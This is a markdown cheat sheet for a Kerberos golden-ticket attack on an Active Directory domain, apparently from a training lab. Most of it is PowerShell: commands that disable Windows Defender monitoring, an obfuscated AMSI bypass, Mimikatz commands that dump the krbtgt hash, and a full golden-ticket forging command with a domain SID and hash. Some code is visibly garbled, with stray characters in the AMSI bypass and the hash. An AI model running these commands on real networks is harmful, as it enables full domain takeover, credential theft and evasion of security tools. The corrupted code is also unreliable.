# Golden Ticket

## Methodology/Steps
> 1. Get a Powershell session as a **"domain admin"** using **"Over pass the hash"** attack
> 2. Create a **New-PSSession** attaching to the **"domain controller"**
> 3. Enter the new session using **Enter-PSSession** 
> 4. Bypass the *AMSI* 
> 5. Exit
> 6. Load **Mimikatz.ps1** on the new session using **Invoke-command**
> 7. Enter the new session using **Enter-PSSession** *again*
> 8. Now we can execute mimikatz on the DC
> 9. Keep note of **krbtgt** hash
> 10. Now go to any **"non domain admin"** account
> 11. Load **Mimikats.ps1** 
> 12. Now we can create a ticket using the DC **krbtgt** hash 
> 13. Now we can access any service on the DC; Example **`ls \\dc-corp\C$`** or 
>     ```powershell
>     PsExec64.exe \\test.local -u Domain\user -p Passw0rd! cmd
>     ```
>     

## Disable Defender 
```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableIOAVProtection $true
```

## AMSI bypass
```powershell
sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{O}"-F'F', 'rE' ) ) 3; ( GeT-VariaBle ( "1Q2U" + "zX" )  -VaL_s+)."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{@}{5}" -f'Util', 'A', 'Amsi','.Management.', 'utomation.','s', 'System' ))."g`etf`iE1D"( ( "{O}{2}{1}" -f'amsi','d','InitFaile' ),("{2}{4}{O}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"(${n`ULl},${t`RuE} )
```

## Execute mimikatz on DC as DA to get krbtgt hash
```powershell
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername dcorp-dc
```

## Create a ticket on any machine [ "pass the ticket" attack]
```powershell
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-268341927-4156871508-1792461683 /krbtgt:a9b30e5bO0dc865eadcea941le4ade72d /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
```

## List Kerberos services available
```powershell
klist
```

## To use the DCSync feature for getting krbtg hash execute the below command with DA privileges
```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```